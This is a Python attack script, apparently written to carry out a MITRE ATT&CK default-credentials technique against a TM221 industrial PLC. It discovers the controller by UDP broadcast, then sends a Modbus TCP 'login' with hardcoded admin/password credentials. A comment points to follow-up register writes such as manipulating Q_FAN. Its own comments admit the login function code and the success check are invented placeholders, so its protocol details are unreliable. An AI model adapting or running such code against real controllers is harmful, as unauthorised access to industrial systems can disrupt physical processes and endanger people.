import socket
import struct
import time

# Define Modbus TCP parameters
MODBUS_PORT = 502
# PLC IP address (dynamically determined later)
PLC_IP = None  # Initialize to None
DEFAULT_USERNAME = "admin"  # Replace with actual default username if known
DEFAULT_PASSWORD = "password"  # Replace with actual default password if known

def discover_plc_ip(timeout=5):
    """
    Attempts to discover the PLC's IP address by broadcasting a discovery packet.
    This is a simplified example and might need adjustments depending on the PLC's discovery protocol.
    This function returns a string
    """
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(timeout)  # Set a timeout for receiving a response
    
    discovery_message = b"Discover TM221"  # Adjust this message if the PLC expects a specific format

    # Send the discovery message to the broadcast address
    sock.sendto(discovery_message, ('<broadcast>', 30000)) # Use a common broadcast port or the one specified by the PLC

    try:
        # Wait for a response from the PLC
        data, addr = sock.recvfrom(1024)
        print(f"Received discovery response from: {addr}")
        
        # Example of extracting IP from data (adjust based on actual response format)
        discovered_ip = addr[0]  # Assume the IP address is in the address tuple
        return discovered_ip

    except socket.timeout:
        print("No PLC discovery response received within the timeout.")
        return None
    except Exception as e:
        print(f"Error during PLC discovery: {e}")
        return None
    finally:
        sock.close()


def craft_modbus_login_request(username, password):
    """
    Crafts a Modbus message to attempt login.
    This is a highly simplified example, as Modbus doesn't natively support login.
    This is a conceptual representation.  Real Modbus devices use function codes for
    reading/writing registers. Authentication would be implemented through custom registers or
    a proprietary protocol on top of Modbus.

    Args:
        username (str): The username to use.
        password (str): The password to use.

    Returns:
        bytes: The Modbus request message.
    """
    # Transaction Identifier (2 bytes) -  Increment for each request
    transaction_id = 1
    # Protocol Identifier (2 bytes) - 0 for Modbus TCP
    protocol_id = 0
    # Length (2 bytes) - Length of the remaining message (Unit Identifier + Function Code + Data)
    #  This needs to be calculated dynamically based on the data.
    unit_id = 1  # Slave address (1-247)
    # Assume a custom function code for login (e.g., 100). This is just for demonstration.
    function_code = 100

    # Pack the username and password into the data field.  This is a simplified representation
    # as Modbus has no direct string support, and authentication isn't standard.
    data = username.encode('ascii') + b'\x00' + password.encode('ascii')  # Null-terminated strings


    length = 1 + 1 + len(data) # Unit ID (1 byte), function code (1 byte), data length
    # Construct the message
    header = struct.pack(">HHH", transaction_id, protocol_id, length)  # Pack header
    request = header + struct.pack("BB", unit_id, function_code) + data
    return request

def send_modbus_request(ip_address, request):
    """
    Sends a Modbus request to the PLC.

    Args:
        ip_address (str): The IP address of the PLC.
        request (bytes): The Modbus request message.

    Returns:
        bytes: The Modbus response message, or None on error.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(5)  # Set a timeout for the connection and response
            sock.connect((ip_address, MODBUS_PORT))
            sock.sendall(request)
            response = sock.recv(1024)
            return response
    except Exception as e:
        print(f"Error communicating with PLC: {e}")
        return None

def check_login_success(response):
    """
    Checks the Modbus response to determine if the login was successful.
    This is a simplified example based on a hypothetical response format.

    Args:
        response (bytes): The Modbus response message.

    Returns:
        bool: True if the login was successful, False otherwise.
    """
    # Example: Check if the function code in the response is the same as the request.
    # A real-world implementation would need to interpret the response data
    # based on the specific custom Modbus protocol used by the PLC.
    if response and len(response) > 7:  # Basic sanity check
        # Assuming the function code is at byte 7
        response_function_code = response[7]
        # Assuming our login function code was 100 (see craft_modbus_login_request)
        if response_function_code == 100:
            # Further check response data (implementation-specific)
            # For example, check for a success/failure code within the data
            return True  # Placeholder for actual success check
        else:
            print("Login failed: Incorrect function code in response.")
            return False
    else:
        print("Login failed: Invalid response.")
        return False

def main():
    """
    Main function to perform the MITRE ATT&CK technique.
    """

    global PLC_IP  # Access the global PLC_IP variable

    # Discover the PLC IP address
    PLC_IP = discover_plc_ip()
    if not PLC_IP:
        print("Failed to discover PLC IP address. Exiting.")
        return

    print(f"Attempting to connect to PLC at IP: {PLC_IP}")

    # Attempt to log in with default credentials
    print(f"Attempting login with default credentials: username={DEFAULT_USERNAME}, password={DEFAULT_PASSWORD}")
    login_request = craft_modbus_login_request(DEFAULT_USERNAME, DEFAULT_PASSWORD)
    login_response = send_modbus_request(PLC_IP, login_request)

    if login_response:
        if check_login_success(login_response):
            print("Successfully logged in using default credentials!")
            # Add code here to perform further actions after successful login,
            # such as reading or writing PLC registers (e.g., manipulating Q_FAN).
            # Example (conceptual):
            #  - craft_modbus_write_request(PLC_IP, address, value)
            #  - send_modbus_request(PLC_IP, write_request)
        else:
            print("Login failed with default credentials.")
    else:
        print("Failed to get a response from the PLC during login attempt.")

if __name__ == "__main__":
    main()